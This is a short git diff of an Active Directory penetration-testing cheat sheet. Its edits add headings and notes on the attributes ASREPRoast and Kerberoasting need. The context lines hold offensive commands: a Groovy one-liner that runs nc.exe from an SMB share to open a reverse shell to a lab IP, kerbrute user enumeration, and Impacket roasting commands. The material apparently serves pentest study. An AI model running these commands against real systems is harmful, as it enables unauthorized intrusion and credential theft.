@@ -15,7 +15,7 @@ println "\\\\10.10.10.10\\smbFolder\\nc.exe -e 10.10.10.10 443".execute().text
 
 ## Enumerating valid users
 
-[kerbrute](https://github.com/ropnop/kerbrute)
+#### [kerbrute](https://github.com/ropnop/kerbrute)
 
 Find **valid** domain controller users
 
@@ -25,13 +25,13 @@ kerbrute userenum --dc 10.10.10.250 -d domain.local users.list
 
 Combinating with [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
 
-Find **ASREPRoast** users
+Find **ASREPRoast** users. Requires with **UF_DONT_REQUIRE_PREAUTH** attribute.
 
 ```powershell
 GetNPUsers.py domain.local/ --no-pass -usersfile valid_users.list
 ```
 
-Find **Kerberoasting** users
+Find **Kerberoasting** users. Requires users with **ServicePrincipalName** attribute.
 
 Combinating with [GetUsersSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
 
